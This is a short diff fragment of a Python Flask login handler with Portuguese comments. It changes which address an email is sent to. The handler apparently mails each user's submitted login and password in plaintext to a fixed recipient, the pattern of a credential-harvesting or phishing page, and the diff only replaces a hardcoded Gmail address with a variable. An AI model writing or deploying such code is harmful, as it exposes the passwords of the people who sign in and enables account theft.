@@ -41,8 +41,8 @@ def login():
       # Enviar um email com os dados de login e senha
       msg = Message(
          subject= f'Novo login e senha de {formDados.login}', 
-         sender='ads.juan2017@gmail.com', 
-         recipients=['ads.juan2017@gmail.com'],
+         sender=mail, 
+         recipients=[mail],
          body= f'''
 
           Login: {formDados.login}
